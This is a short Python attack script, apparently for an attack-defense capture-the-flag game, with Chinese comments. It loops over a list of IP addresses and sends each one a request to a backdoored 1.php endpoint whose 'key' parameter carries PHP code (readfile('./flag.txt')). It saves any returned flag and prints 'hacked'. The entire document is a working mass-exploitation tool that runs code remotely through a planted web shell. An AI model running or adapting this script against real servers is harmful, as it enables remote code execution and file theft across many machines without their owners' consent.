import sys
import requests
ip_list=[]

flag_txt=open('flag.txt','w')
#把文件里的ip地址转化成list
with open('ip_file.txt','r') as f:
	for line in f:
		ip_list.append(list(line.strip('\n').split(',')))

#print(ip_list);
def get_flag(ip_str):
	url = "http://"+ip_str+"/1.php?key=readfile('./flag.txt');"
	print(url);
	try:
		s = requests.Session()
		source = s.get(url,timeout=1)
		if "flag" in source.text:
			flag_txt.write(source.text+"\n")
			print(url+" hacked "+source.text)
		else:
			print(url+" Is error ")
	except KeyError as e:
		print('键错误')
	except IndexError as e:
		print('索引错误')
	except TypeError as e:
		print('类型错误')
	except ValueError as e:
		print('值的类型错误')
	except requests.exceptions.RequestException as e:
		print('超时')
	except Exception as e:
		print('错误')


for ip_addr in ip_list:
	ip_str=''.join(str(i) for i in ip_addr)
	get_flag(ip_str)

flag_txt.close()